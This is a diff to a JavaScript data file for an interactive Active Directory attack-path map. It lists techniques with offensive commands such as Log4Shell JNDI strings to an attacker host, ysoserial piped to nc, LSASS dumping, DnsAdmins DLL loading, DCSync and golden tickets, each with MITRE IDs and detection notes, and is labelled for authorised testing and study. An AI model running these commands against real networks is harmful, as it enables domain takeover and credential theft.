@@ -15,9 +15,11 @@
     nodes[]   { id, label, lv(level index), cat, type,
                 desc,
                 cmds:  [ "example command", ... ],     // 1-2, # comments dim
+                variants:[ {label, cmds:[...], note?} ],// optional deeper sub-steps
                 attack:["T1557.001", ...],             // MITRE ATT&CK IDs
                 prereq:"what you must already hold",    // the "why here" line
                 detect:"detection / OPSEC one-liner",
+                flag:  "hot" | "danger" | null,         // 🔥 common/quick, 🧨 risky
                 th:    "theory-key" | null,             // -> theory{} entry
                 tools: [[name, toolkitId|null], ...],   // null = no page yet
                 vuln:  [label, vulnId|null] | null,     // null id = no page yet
@@ -32,8 +34,8 @@
 var AD_MAP = {
   meta: {
     title: "Active Directory Attack Path",
-    version: "v2026.09",
-    note: "For authorised testing and study only."
+    version: "v2026.10",
+    note: "For authorised testing and study only. Tap any node for commands, prerequisites, detection and links."
   },
 
   levels: [
@@ -48,6 +50,7 @@ var AD_MAP = {
 
   cats: [
     { id: "recon",   label: "Recon & Enumeration",        color: "#94a3b8" },
+    { id: "perim",   label: "Perimeter / low-hanging fruit", color: "#818cf8" },
     { id: "relay",   label: "Poisoning, Coercion & Relay", color: "#60a5fa" },
     { id: "roast",   label: "Roasting & Cracking",        color: "#38bdf8" },
     { id: "acl",     label: "ACL, GPO & Delegation setup", color: "#a78bfa" },
@@ -127,9 +130,36 @@ var AD_MAP = {
       cmds: ["# in BloodHound: mark your user Owned, then \"Shortest paths to Domain Admins\"", "MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group)) WHERE g.name CONTAINS 'DOMAIN ADMINS' RETURN p"],
       attack: ["T1482", "T1069.002"], prereq: "collected BloodHound data (see LDAP enum)", detect: "Analysis is offline — no on-network signal beyond the collection itself.",
       th: "acls", tools: [["BloodHound", "bloodhound"], ["ADCollector", "adcollector"]], vuln: null },
+    { id: "user-enum", label: "Enumerate valid usernames", lv: 0, cat: "recon", type: "enum", kind: "entry",
+      desc: "Build a user list with no password — RID cycling, Kerberos user enumeration, or OSINT-derived name patterns.",
+      cmds: ["kerbrute userenum -d <domain> --dc <dc_ip> names.txt", "nxc smb <dc_ip> -u '' -p '' --rid-brute   # RID cycling via null session"],
+      attack: ["T1087.002", "T1589.001"], prereq: "reachable DC; a name wordlist (or OSINT)", detect: "Kerberos pre-auth 4768/4771 spikes for many non-existent users.",
+      th: "kerberos", tools: [["kerbrute", "kerbrute"], ["NetExec", "netexec"]], vuln: null },
+
+    /* ---------- Perimeter / low-hanging fruit ---------- */
+    { id: "web-exploit", label: "App-server / web exploit", lv: 0, cat: "perim", type: "attack", kind: "entry",
+      desc: "Exposed management consoles and app servers (Tomcat, JBoss, Jenkins, RMI) that deploy a WAR/app become code execution on an internal host.",
+      cmds: ["# Tomcat manager: deploy a WAR shell after a weak-cred login", "msfconsole -q -x 'use exploit/multi/http/tomcat_mgr_deploy; set RHOSTS <ip>; run'"],
+      attack: ["T1190"], prereq: "an internet/intranet-facing app server with weak creds or a known RCE", detect: "New app/WAR deployments; web-shell files; child processes under the app-server service.",
+      th: null, tools: [["Metasploit", null], ["ffuf", "ffuf"]], vuln: ["Default credentials", "default-credentials"] },
+    { id: "deserialize", label: "Java/​.NET deserialization", lv: 0, cat: "perim", type: "attack", kind: "entry",
+      desc: "An endpoint that deserializes attacker-controlled objects (Java RMI, ViewState, serialized ports) → RCE via a gadget chain.",
+      cmds: ["java -jar ysoserial.jar CommonsCollections5 'cmd' | nc <target> <port>"],
+      attack: ["T1190"], prereq: "a service that deserializes untrusted input; a viable gadget on its classpath", detect: "Deserialization exceptions; unexpected child processes from the app runtime.",
+      th: null, tools: [["ysoserial", "ysoserial"]], vuln: ["Insecure deserialization", "insecure-deserialization"] },
+    { id: "log4shell", label: "Log4Shell (JNDI)", lv: 0, cat: "perim", type: "attack", kind: "entry", cve: "CVE-2021-44228",
+      desc: "A logged, attacker-controlled string triggers a JNDI/LDAP lookup that loads a remote class — pre-auth RCE on vulnerable log4j apps.",
+      cmds: ["# inject: ${jndi:ldap://<attacker_ip>:1389/a}  into a logged field (header/UA/username)", "# serve the payload with a JNDI exploit kit + LDAP referral to your class"],
+      attack: ["T1190"], prereq: "an app logging attacker input with a vulnerable log4j (2.0–2.14.1)", detect: "Outbound LDAP/RMI from the app server; ${jndi:} patterns in requests/logs.",
+      th: null, tools: [["Metasploit", null]], vuln: ["Command injection", "command-injection"] },
+    { id: "proxylogon", label: "Exchange pre-auth (ProxyLogon)", lv: 0, cat: "perim", type: "attack", kind: "entry", cve: "CVE-2021-26855…",
+      desc: "SSRF + write chains on on-prem Exchange give pre-auth RCE and mailbox access from the perimeter (ProxyLogon / ProxyShell family).",
+      cmds: ["# ProxyLogon: SSRF to the backend, then write a webshell to an OWA path", "# many public PoCs chain CVE-2021-26855 + 27065"],
+      attack: ["T1190"], prereq: "an internet-facing unpatched Exchange server", detect: "Anomalous autodiscover/EWS requests; new aspx files in Exchange virtual dirs.",
+      th: null, tools: [["Metasploit", null]], vuln: null },
 
     /* ---------- Poisoning, coercion & relay ---------- */
-    { id: "llmnr", label: "LLMNR / NBT-NS / mDNS poisoning", lv: 0, cat: "relay", type: "attack", kind: "entry",
+    { id: "llmnr", label: "LLMNR / NBT-NS / mDNS poisoning", lv: 0, cat: "relay", type: "attack", kind: "entry", flag: "hot",
       desc: "Answer broadcast name-resolution requests to capture NetNTLM hashes.",
       cmds: ["responder -I <interface> -wv   # answer LLMNR/NBT-NS/mDNS, capture NetNTLMv2"],
       attack: ["T1557.001"], prereq: "same broadcast domain as victims; LLMNR/NBT-NS still enabled", detect: "Defenders can plant honey-name queries; poisoners answer names that never existed.",
@@ -144,7 +174,7 @@ var AD_MAP = {
       cmds: ["mitm6 -d <domain>", "ntlmrelayx.py -6 -t ldaps://<dc_ip> -wh <fake_wpad> --delegate-access"],
       attack: ["T1557"], prereq: "same L2 segment; IPv6 not disabled/filtered", detect: "Rogue DHCPv6 advertisements and a new IPv6 DNS server are strong anomalies.",
       th: "coercion", tools: [["mitm6", null], ["ntlmrelayx", "ntlmrelayx"]], vuln: ["NTLM relay", "ntlm-relay-vuln"] },
-    { id: "coerce", label: "Coerce authentication", lv: 0, cat: "relay", type: "attack", kind: "entry",
+    { id: "coerce", label: "Coerce authentication", lv: 0, cat: "relay", type: "attack", kind: "entry", flag: "hot",
       desc: "Force a machine (often a DC) to authenticate to you — PetitPotam, PrinterBug, DFSCoerce, WebDAV.",
       cmds: ["coercer coerce -u <user> -p '<pass>' -d <domain> -t <target_dc> -l <attacker_ip>"],
       attack: ["T1187"], prereq: "a domain account (some methods work unauth); a listener to relay/capture to", detect: "Unexpected DC-initiated SMB/RPC auth to a workstation is a high-fidelity signal.",
@@ -176,7 +206,7 @@ var AD_MAP = {
       th: "kerberos", tools: [["krbrelayx", "krbrelayx"], ["ntlmrelayx", "ntlmrelayx"]], vuln: ["NTLM relay", "ntlm-relay-vuln"] },
 
     /* ---------- Roasting & cracking ---------- */
-    { id: "pw-spray", label: "Password spraying", lv: 0, cat: "roast", type: "attack", kind: "entry",
+    { id: "pw-spray", label: "Password spraying", lv: 0, cat: "roast", type: "attack", kind: "entry", flag: "hot",
       desc: "Spray one common password across the user list, respecting lockout, to land a valid account.",
       cmds: ["kerbrute passwordspray -d <domain> --dc <dc_ip> users.txt '<Season2026!>'", "nxc smb <dc_ip> -u users.txt -p '<Password1>' --continue-on-success"],
       attack: ["T1110.003"], prereq: "a valid user list and the lockout policy (spray below the threshold)", detect: "Bursts of 4625 failures across many accounts from one source; Kerberos pre-auth (4771) spikes.",
@@ -196,12 +226,12 @@ var AD_MAP = {
       cmds: ["hashcat -m 5600 netntlmv2.txt wordlist.txt -r rules/best64.rule   # NetNTLMv2", "hashcat -m 13100 kerberoast.txt wordlist.txt   # TGS-REP"],
       attack: ["T1110.002"], prereq: "captured hash material and a wordlist/GPU", detect: "Entirely offline — no network signal.",
       th: "credstore", tools: [["hashcat", null], ["John", null]], vuln: null },
-    { id: "kerberoast", label: "Kerberoasting", lv: 2, cat: "roast", type: "attack",
+    { id: "kerberoast", label: "Kerberoasting", lv: 2, cat: "roast", type: "attack", flag: "hot",
       desc: "Request service tickets for SPN accounts and crack their passwords offline.",
       cmds: ["GetUserSPNs.py <domain>/<user>:'<pass>' -dc-ip <dc_ip> -request", "Rubeus.exe kerberoast /nowrap"],
       attack: ["T1558.003"], prereq: "any valid domain credential; a service account with an SPN", detect: "Many TGS-REQ (4769) for RC4 (etype 0x17) from one host in a short window.",
       th: "kerberoast", tools: [["Rubeus", "rubeus"], ["Impacket", "impacket-suite"], ["NetExec", "netexec"]], vuln: ["Kerberoasting", "kerberoasting-vuln"] },
-    { id: "asrep", label: "AS-REP roasting", lv: 2, cat: "roast", type: "attack",
+    { id: "asrep", label: "AS-REP roasting", lv: 2, cat: "roast", type: "attack", flag: "hot",
       desc: "Enumerate and roast pre-auth-disabled accounts as an authenticated user.",
       cmds: ["GetNPUsers.py <domain>/<user>:'<pass>' -request -format hashcat", "Rubeus.exe asreproast /nowrap"],
       attack: ["T1558.004"], prereq: "a valid credential to enumerate; DONT_REQ_PREAUTH accounts", detect: "4768 pre-auth-type-0 events; enumeration of userAccountControl flags.",
@@ -262,12 +292,21 @@ var AD_MAP = {
       th: "deleg", tools: [["Rubeus", "rubeus"], ["Coercer", "coercer"], ["Impacket", "impacket-suite"]], vuln: ["Unconstrained delegation", "unconstrained-delegation"] },
     { id: "constrained", label: "Constrained delegation (S4U)", lv: 2, cat: "deleg", type: "attack",
       desc: "msDS-AllowedToDelegateTo lets you request tickets to the listed services as any user.",
-      cmds: ["getST.py -spn cifs/<target> -impersonate administrator -dc-ip <dc_ip> <domain>/<svc>:'<pass>'", "Rubeus.exe s4u /user:<svc> /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/<target>"],
+      cmds: ["getST.py -spn cifs/<target> -impersonate administrator -dc-ip <dc_ip> <domain>/<svc>:'<pass>'"],
+      variants: [
+        { label: "With protocol transition (any user)", cmds: ["Rubeus.exe s4u /user:<svc> /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/<target> /ptt"], note: "TRUST_TO_AUTH_FOR_DELEGATION — you can impersonate anyone." },
+        { label: "Without protocol transition (Kerberos only)", cmds: ["# needs a real inbound Kerberos ticket to relay via S4U2Proxy"], note: "TRUSTED_FOR_DELEGATION only — pair with a coerced/relayed ticket." },
+        { label: "Alt-service trick", cmds: ["Rubeus.exe s4u ... /altservice:cifs,host,http,ldap/<target>"], note: "One TGS can be rewritten to sibling SPNs on the same host." }
+      ],
       attack: ["T1558"], prereq: "control of an account with msDS-AllowedToDelegateTo set", detect: "S4U2Proxy ticket requests (4769) impersonating privileged users.",
       th: "deleg", tools: [["Rubeus", "rubeus"], ["Impacket", "impacket-suite"]], vuln: ["Constrained delegation", "constrained-delegation"] },
     { id: "rbcd", label: "Resource-based constrained delegation", lv: 2, cat: "deleg", type: "attack",
       desc: "Write msDS-AllowedToActOnBehalfOfOtherIdentity, then S4U to impersonate anyone on the target.",
       cmds: ["rbcd.py -delegate-from '<fakepc$>' -delegate-to '<target$>' -action write <domain>/<user>:'<pass>'", "getST.py -spn cifs/<target> -impersonate administrator '<domain>/<fakepc$>:<pass>'"],
+      variants: [
+        { label: "Classic RBCD (need a computer you control)", cmds: ["# add a computer via MachineAccountQuota, then write RBCD from it to the target"] },
+        { label: "Self-RBCD", cmds: ["# write the target's own SID into its msDS-AllowedToActOnBehalfOfOtherIdentity"], note: "Combined with a shadow-cred or key you can S4U to yourself on the host." }
+      ],
       attack: ["T1098", "T1558"], prereq: "GenericWrite over the target computer; a controlled principal with an SPN", detect: "msDS-AllowedToActOnBehalfOfOtherIdentity writes (5136) on computer objects.",
       th: "deleg", tools: [["StandIn", "standin"], ["Get-RBCD-Threaded", "get-rbcd-threaded"], ["Rubeus", "rubeus"], ["bloodyAD", "bloodyad"]], vuln: ["Resource-based constrained delegation", "rbcd"] },
     { id: "s4u2self", label: "S4U2self abuse", lv: 2, cat: "deleg", type: "attack",
@@ -282,14 +321,19 @@ var AD_MAP = {
       th: "deleg", tools: [["Impacket (addcomputer)", "impacket-suite"], ["bloodyAD", "bloodyad"], ["PowerMad", null]], vuln: ["Resource-based constrained delegation", "rbcd"] },
 
     /* ---------- AD CS ---------- */
-    { id: "adcs-enum", label: "Enumerate AD CS", lv: 2, cat: "adcs", type: "enum",
+    { id: "adcs-enum", label: "Enumerate AD CS", lv: 2, cat: "adcs", type: "enum", flag: "hot",
       desc: "Find CAs and templates and flag the vulnerable ESC classes (ESC1–ESC15).",
       cmds: ["certipy find -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> -vulnerable -stdout", "Certify.exe find /vulnerable"],
       attack: ["T1649"], prereq: "any valid domain credential", detect: "Enumeration is low-signal; bulk template reads over LDAP may be noticed.",
       th: "adcs", tools: [["Certipy", "certipy"], ["Certify", "certify"], ["certutil", null]], vuln: ["AD CS ESC misconfigurations", "adcs-esc"] },
-    { id: "esc1", label: "ESC1 — arbitrary SAN", lv: 2, cat: "adcs", type: "attack",
+    { id: "esc1", label: "ESC1 — arbitrary SAN", lv: 2, cat: "adcs", type: "attack", flag: "hot",
       desc: "Enrollee-supplies-subject template lets you request a cert as any user.",
       cmds: ["certipy req -u <user>@<domain> -p '<pass>' -ca <ca_name> -template <vuln_template> -upn administrator@<domain>", "certipy auth -pfx administrator.pfx -dc-ip <dc_ip>"],
+      variants: [
+        { label: "Request as any user (Linux)", cmds: ["certipy req -u <user>@<domain> -p '<pass>' -target <ca_server> -ca <ca_name> -template '<vuln_template>' -upn administrator@<domain>"] },
+        { label: "Request (Windows)", cmds: ["certify.exe request /ca:<server>\\<ca_name> /template:'<vuln_template>' /altname:administrator"] },
+        { label: "Use the cert", cmds: ["certipy auth -pfx administrator.pfx -dc-ip <dc_ip>   # -> TGT + NT hash"], note: "Then Pass-the-Ticket / UnPAC the hash." }
+      ],
       attack: ["T1649"], prereq: "enroll rights on a template with ENROLLEE_SUPPLIES_SUBJECT + client-auth EKU", detect: "Certificate issued with a SAN mismatched to the requester (CA issuance log).",
       th: "adcs", tools: [["Certipy", "certipy"], ["Certify", "certify"]], vuln: ["AD CS ESC misconfigurations", "adcs-esc"] },
     { id: "esc2-3", label: "ESC2 / ESC3 — any-purpose / agent", lv: 2, cat: "adcs", type: "attack",
@@ -411,9 +455,14 @@ var AD_MAP = {
       cmds: ["# mimikatz:", "token::elevate ; token::list   # then impersonate a listed privileged token"],
       attack: ["T1134.001"], prereq: "SYSTEM/high integrity on a host where a privileged token is present", detect: "Token manipulation and process access to lsass/other sessions.",
       th: "tokens", tools: [["mimikatz", "mimikatz"], ["incognito", null]], vuln: ["Token impersonation", "token-impersonation"] },
-    { id: "lateral", label: "Lateral movement", lv: 4, cat: "lateral", type: "attack",
+    { id: "lateral", label: "Lateral movement", lv: 4, cat: "lateral", type: "attack", flag: "hot",
       desc: "SMB / WMI / WinRM / DCOM / PsExec / scheduled tasks with recovered credentials to reach new hosts.",
       cmds: ["psexec.py / smbexec.py / wmiexec.py / atexec.py / dcomexec.py <domain>/<user>:'<pass>'@<target>", "evil-winrm -i <target> -u <user> -H <nthash>   # WinRM with a hash"],
+      variants: [
+        { label: "Exec engines (pick by OPSEC)", cmds: ["wmiexec.py / dcomexec.py <domain>/<user>:'<pass>'@<target>   # no service, quieter", "psexec.py <domain>/<user>:'<pass>'@<target>   # creates a service — noisy"] },
+        { label: "With a hash / ticket", cmds: ["nxc smb <target> -u <user> -H <nthash> -x 'whoami'", "export KRB5CCNAME=t.ccache; nxc smb <target> -k --use-kcache"] },
+        { label: "Pivot / SOCKS", cmds: ["ntlmrelayx.py -tf targets.txt -socks", "proxychains wmiexec.py -no-pass <domain>/<user>@<target>"], note: "Relay + SOCKS reaches segments you can't route to directly." }
+      ],
       attack: ["T1021.002", "T1021.006", "T1570"], prereq: "valid creds/hash and local-admin (or a service right) on the target", detect: "Service creation (7045), scheduled tasks (4698), WinRM/WMI logons, 4624 type-3 from new sources.",
       th: "ntlm", tools: [["NetExec", "netexec"], ["Impacket", "impacket-suite"], ["Evil-WinRM", "evil-winrm"], ["CIMplant", "cimplant"]], vuln: ["Remote execution", "remote-execution"] },
     { id: "evasion", label: "AMSI / CLM / AppLocker bypass", lv: 3, cat: "lateral", type: "attack",
@@ -436,6 +485,11 @@ var AD_MAP = {
     { id: "lsass", label: "Dump LSASS", lv: 4, cat: "creds", type: "cred",
       desc: "Pull NT hashes, Kerberos keys and sometimes cleartext for logged-on users.",
       cmds: ["nanodump.exe --write C:\\Windows\\Temp\\l.dmp   # or comsvcs MiniDump", "# PPL in the way? strip it with mimidriver: mimikatz \"!processprotect /process:lsass.exe /remove\""],
+      variants: [
+        { label: "Remote, one-liner", cmds: ["nxc smb <target> -u <user> -p '<pass>' -M lsassy"] },
+        { label: "Dump then parse offline (quieter)", cmds: ["# comsvcs MiniDump or nanodump -> l.dmp", "pypykatz lsa minidump l.dmp"] },
+        { label: "Defeat PPL first", cmds: ["mimikatz \"!+\" \"!processprotect /process:lsass.exe /remove\" privilege::debug sekurlsa::logonpasswords"], note: "Loading mimidriver.sys is loud — EDR flags it." }
+      ],
       attack: ["T1003.001"], prereq: "SYSTEM/high integrity on the host; defeat LSA protection (PPL) if enabled", detect: "Process access to lsass.exe (Sysmon 10) from non-system tools; suspicious signed-driver loads (mimidriver).",
       th: "inmemory", tools: [["mimikatz", "mimikatz"], ["minidumpdotnet", "minidumpdotnet"], ["SharpSecDump", "sharpsecdump"], ["NetExec", "netexec"]], vuln: ["LSASS dumping", "lsass-dumping"] },
     { id: "sam", label: "Dump SAM & LSA secrets", lv: 4, cat: "creds", type: "cred",
@@ -453,7 +507,7 @@ var AD_MAP = {
       cmds: ["KeePwn.py search -u <user> -p '<pass>' -d <domain> -t <target>", "# CVE-2023-32784: recover master password from a KeePass process dump"],
       attack: ["T1555.005"], prereq: "file access to the .kdbx (and a way at the master key/keyfile)", detect: "Access to .kdbx files and KeePass config; unusual process dumps of KeePass.",
       th: "credstore", tools: [["KeeThief", null], ["mimikatz", "mimikatz"]], vuln: ["Stored credential harvesting", "stored-cred-harvest"] },
-    { id: "pth", label: "Pass-the-Hash", lv: 2, cat: "creds", type: "cred",
+    { id: "pth", label: "Pass-the-Hash", lv: 2, cat: "creds", type: "cred", flag: "hot",
       desc: "Authenticate with an NT hash instead of a password — reuse it across hosts.",
       cmds: ["nxc smb <target> -u <user> -H <nthash>", "psexec.py -hashes :<nthash> <domain>/<user>@<target>"],
       attack: ["T1550.002"], prereq: "a valid NT hash and a target where that account has rights", detect: "NTLM type-3 logons (4624) where no interactive logon preceded them.",
@@ -470,17 +524,17 @@ var AD_MAP = {
       th: "kerberos", tools: [["Rubeus", "rubeus"], ["Certipy", "certipy"]], vuln: ["AD CS ESC misconfigurations", "adcs-esc"] },
 
     /* ---------- Domain dominance & trusts ---------- */
-    { id: "dcsync", label: "DCSync", lv: 5, cat: "persist", type: "objective", kind: "goal",
+    { id: "dcsync", label: "DCSync", lv: 5, cat: "persist", type: "objective", kind: "goal", flag: "hot",
       desc: "Replicate any account's hashes — including krbtgt — straight from a DC.",
       cmds: ["secretsdump.py -just-dc-user krbtgt <domain>/<user>@<dc_ip>", "lsadump::dcsync /domain:<domain> /user:krbtgt   # mimikatz"],
       attack: ["T1003.006"], prereq: "DS-Replication-Get-Changes(-All) rights (DA, or a granted ACL)", detect: "DsGetNCChanges (replication) from a non-DC host — a high-fidelity DCSync alert.",
       th: "dcsync", tools: [["mimikatz", "mimikatz"], ["secretsdump", "impacket-suite"], ["SharpSecDump", "sharpsecdump"], ["NetExec", "netexec"]], vuln: ["DCSync", "dcsync-vuln"] },
-    { id: "ntds", label: "Dump NTDS.dit", lv: 5, cat: "persist", type: "objective",
+    { id: "ntds", label: "Dump NTDS.dit", lv: 5, cat: "persist", type: "objective", flag: "hot",
       desc: "Extract the entire domain database of hashes for offline cracking.",
       cmds: ["secretsdump.py -just-dc <domain>/<user>@<dc_ip>", "ntdsutil 'ac i ntds' 'ifm' 'create full C:\\temp' q q   # on the DC"],
       attack: ["T1003.003"], prereq: "admin on a DC (or DCSync rights) to read/replicate NTDS", detect: "IFM/VSS snapshots on a DC; ntdsutil execution; large replication pulls.",
       th: "dcsync", tools: [["secretsdump", "impacket-suite"], ["NetExec", "netexec"], ["mimikatz", "mimikatz"]], vuln: ["NTDS.dit extraction", "ntds-extraction"] },
-    { id: "golden", label: "Golden ticket", lv: 5, cat: "persist", type: "objective",
+    { id: "golden", label: "Golden ticket", lv: 5, cat: "persist", type: "objective", flag: "danger",
       desc: "Forge a TGT with the krbtgt key — any user, any group, until krbtgt is rotated twice.",
       cmds: ["ticketer.py -aesKey <krbtgt_aes> -domain-sid <sid> -domain <domain> administrator", "Rubeus.exe golden /aes256:<krbtgt_aes> /user:administrator /sid:<sid> /domain:<domain>"],
       attack: ["T1558.001"], prereq: "the krbtgt key (from DCSync/NTDS) and the domain SID", detect: "TGTs with anomalous lifetimes/PACs; TGS (4769) with no preceding AS-REQ.",
@@ -505,17 +559,17 @@ var AD_MAP = {
       cmds: ["# on DC: set HKLM\\System\\CurrentControlSet\\Control\\Lsa\\DsrmAdminLogonBehavior = 2", "# then PtH with the DSRM (local admin) hash to the DC"],
       attack: ["T1556", "T1078.003"], prereq: "admin on a DC to dump the DSRM hash and set the registry value", detect: "DsrmAdminLogonBehavior registry change; DSRM-account network logon.",
       th: "credstore", tools: [["mimikatz", "mimikatz"]], vuln: ["DSRM persistence", "dsrm-persistence"] },
-    { id: "skeleton", label: "Skeleton Key", lv: 5, cat: "persist", type: "objective",
+    { id: "skeleton", label: "Skeleton Key", lv: 5, cat: "persist", type: "objective", flag: "danger",
       desc: "Patch LSASS on a DC to accept a master password for every account.",
       cmds: ["misc::skeleton   # mimikatz, on the DC (in-memory, resets on reboot)"],
       attack: ["T1556.001"], prereq: "admin/SYSTEM on a DC", detect: "LSASS patching on a DC; every account suddenly accepting a second password.",
       th: "kerberos", tools: [["mimikatz", "mimikatz"]], vuln: null },
-    { id: "custom-ssp", label: "Custom SSP", lv: 5, cat: "persist", type: "objective",
+    { id: "custom-ssp", label: "Custom SSP", lv: 5, cat: "persist", type: "objective", flag: "danger",
       desc: "Register a malicious Security Support Provider to log all authentications in cleartext.",
       cmds: ["# drop mimilib.dll and add it to HKLM\\System\\...\\Lsa\\Security Packages", "misc::memssp   # in-memory variant"],
       attack: ["T1547.005"], prereq: "admin/SYSTEM on the target (ideally a DC)", detect: "New entries in the LSA Security Packages registry value; unsigned SSP DLLs.",
       th: "credstore", tools: [["mimikatz", "mimikatz"]], vuln: null },
-    { id: "dcshadow", label: "DCShadow", lv: 5, cat: "persist", type: "objective",
+    { id: "dcshadow", label: "DCShadow", lv: 5, cat: "persist", type: "objective", flag: "danger",
       desc: "Register a rogue DC to push malicious directory changes stealthily.",
       cmds: ["lsadump::dcshadow /object:<target> /attribute:<attr> /value:<value>   # then /push"],
       attack: ["T1207"], prereq: "DA-equivalent rights to register an nTDSDSA object", detect: "Unexpected replication from a non-DC; short-lived DC registration in the config partition.",
@@ -562,7 +616,7 @@ var AD_MAP = {
       th: "trusts", tools: [["AADInternals", null], ["adconnectdump", null]], vuln: null },
 
     /* ---------- Known CVEs (fast paths) ---------- */
-    { id: "zerologon", label: "Zerologon", lv: 0, cat: "creds", type: "attack", kind: "entry", cve: "CVE-2020-1472",
+    { id: "zerologon", label: "Zerologon", lv: 0, cat: "creds", type: "attack", kind: "entry", cve: "CVE-2020-1472", flag: "danger",
       desc: "Reset the DC machine-account password to Netlogon-empty, then DCSync the domain.",
       cmds: ["nxc smb <dc_ip> -M zerologon", "# then secretsdump.py with the empty machine account -> DCSync"],
       attack: ["T1210", "T1003.006"], prereq: "network access to an unpatched DC (pre-Aug 2020)", detect: "Netlogon 4742/5805 anomalies; a DC machine-account password reset over Netlogon.",
@@ -587,7 +641,7 @@ var AD_MAP = {
       cmds: ["noPac.py <domain>/<user>:'<pass>' -dc-ip <dc_ip> --impersonate administrator -dump"],
       attack: ["T1558"], prereq: "MachineAccountQuota > 0 on an unpatched DC", detect: "Machine renamed to a DC name; TGS for a DC$ with a mismatched sAMAccountName.",
       th: "tickets", tools: [["noPac", null], ["Impacket", "impacket-suite"]], vuln: ["Kerberos ticket attacks", "kerberos-ticket-attacks"] },
-    { id: "printnightmare", label: "PrintNightmare", lv: 3, cat: "lateral", type: "attack", cve: "CVE-2021-1675/34527",
+    { id: "printnightmare", label: "PrintNightmare", lv: 3, cat: "lateral", type: "attack", cve: "CVE-2021-1675/34527", flag: "danger",
       desc: "Print Spooler RCE — SYSTEM locally or on a remote spooler.",
       cmds: ["CVE-2021-1675.py <domain>/<user>:'<pass>'@<target> '\\\\<attacker>\\share\\evil.dll'"],
       attack: ["T1068"], prereq: "Spooler service running; a driver-install path (local or remote)", detect: "Spooler loading a DLL from a remote/user path; new printer drivers.",
@@ -626,7 +680,39 @@ var AD_MAP = {
       desc: "Relay SMB authentication back to the originating host to dump its secrets.",
       cmds: ["# reflective SMB->SMB relay (mitigated on modern Windows)"],
       attack: ["T1557.001"], prereq: "a host that allows reflective SMB relay (legacy/unpatched)", detect: "Loopback/self-directed SMB authentication.",
-      th: "ntlm", tools: [["ntlmrelayx", "ntlmrelayx"]], vuln: ["NTLM relay", "ntlm-relay-vuln"] }
+      th: "ntlm", tools: [["ntlmrelayx", "ntlmrelayx"]], vuln: ["NTLM relay", "ntlm-relay-vuln"] },
+
+    /* ---------- Additional techniques (v2026.10) ---------- */
+    { id: "rc4-downgrade", label: "Kerberos RC4 downgrade", lv: 0, cat: "roast", type: "attack", kind: "entry", cve: "CVE-2022-33679",
+      desc: "Force an RC4-MD4 AS-REP for a pre-auth-disabled account and brute the session key to obtain a usable TGT — no password.",
+      cmds: ["python CVE-2022-33679.py <domain>/<asrep_user> <dc_ip>", "# yields a TGT; then Pass-the-Ticket"],
+      attack: ["T1558.004"], prereq: "a target account with pre-auth disabled on an unpatched DC", detect: "AS-REQ requesting RC4 (etype 0x17) with no pre-auth.",
+      th: "kerberos", tools: [["Impacket", "impacket-suite"]], vuln: ["AS-REP roasting", "asrep-roasting-vuln"] },
+    { id: "webdav-coerce", label: "WebClient / WebDAV coercion", lv: 0, cat: "relay", type: "attack", kind: "entry",
+      desc: "If the WebClient service runs, coerce HTTP auth (not just SMB) so it can be relayed to AD CS (ESC8) or LDAP with signing not in the way.",
+      cmds: ["# check for WebClient: nxc smb <range> -M webdav", "# coerce with a listener like \\\\<attacker>@80/x, then relay HTTP"],
+      attack: ["T1187", "T1557.001"], prereq: "target running the WebClient service; a coercion primitive", detect: "Outbound WebDAV/HTTP auth from a host that shouldn't initiate it.",
+      th: "coercion", tools: [["Coercer", "coercer"], ["ntlmrelayx", "ntlmrelayx"]], vuln: ["Authentication coercion", "authentication-coercion"] },
+    { id: "dnsadmin", label: "DnsAdmins → DLL on DC", lv: 2, cat: "acl", type: "attack", flag: "danger",
+      desc: "Members of DnsAdmins can set a server-level plugin DLL; restarting the DNS service (often on a DC) loads it as SYSTEM.",
+      cmds: ["dnscmd <dc> /config /serverlevelplugindll \\\\<attacker>\\share\\evil.dll", "sc \\\\<dc> stop dns && sc \\\\<dc> start dns   # loads the DLL as SYSTEM"],
+      attack: ["T1574.002"], prereq: "membership in DnsAdmins and the ability to restart the DNS service", detect: "ServerLevelPluginDll registry change on a DC; DNS service restarts.",
+      th: "acls", tools: [["dnscmd", null]], vuln: ["AD ACL abuse", "ad-acl-abuse"] },
+    { id: "cached-creds", label: "Cached domain creds (MSCache2)", lv: 4, cat: "creds", type: "cred",
+      desc: "Domain logons are cached (DCC2) on member hosts; extract and crack them offline when the DC is unreachable.",
+      cmds: ["nxc smb <target> -u <user> -H <nthash> --lsa   # dumps cached DCC2", "hashcat -m 2100 mscache2.txt wordlist.txt   # slow — DCC2 is expensive"],
+      attack: ["T1003.005"], prereq: "local admin/SYSTEM on a host with cached domain logons", detect: "SECURITY hive / cached-creds access; large DCC2 cracking jobs are offline.",
+      th: "credstore", tools: [["mimikatz", "mimikatz"], ["secretsdump", "impacket-suite"], ["NetExec", "netexec"]], vuln: ["SAM & LSA secrets", "sam-lsa-secrets"] },
+    { id: "foreign-group", label: "Foreign group membership", lv: 2, cat: "persist", type: "enum",
+      desc: "Principals from one domain placed in another domain's groups are a ready-made cross-trust foothold — enumerate them and reuse the access.",
+      cmds: ["Get-DomainForeignGroupMember -Domain <target_domain>", "MATCH p=(n)-[:MemberOf]->(m:Group) WHERE n.domain<>m.domain RETURN p"],
+      attack: ["T1482"], prereq: "any valid credential and a trust to enumerate across", detect: "Cross-domain group membership queries; low signal.",
+      th: "trusts", tools: [["PowerView", "powerview"], ["BloodHound", "bloodhound"]], vuln: ["Domain / forest trust key abuse", "domain-trust-key-abuse"] },
+    { id: "forest-sid", label: "Forest → forest (SID history)", lv: 6, cat: "persist", type: "objective", kind: "goal",
+      desc: "Across a forest trust, an extra-SID in the < 1000 RID range is filtered — but non-default SIDs (e.g. a foreign group > 1000) can survive TREAT_AS_EXTERNAL and grant access.",
+      cmds: ["mimikatz kerberos::golden /user:Administrator /krbtgt:<hash> /sids:<target_domain_sid>-<GROUP_SID_>1000 /ptt"],
+      attack: ["T1558.001", "T1134.005"], prereq: "DA + krbtgt in your domain; a trusting forest that doesn't filter the chosen SID", detect: "Inter-forest tickets carrying unexpected extra SIDs.",
+      th: "trusts", tools: [["mimikatz", "mimikatz"], ["Rubeus", "rubeus"]], vuln: ["Domain / forest trust key abuse", "domain-trust-key-abuse"] }
   ],
 
   edges: [
@@ -685,6 +771,16 @@ var AD_MAP = {
     /* trusts */
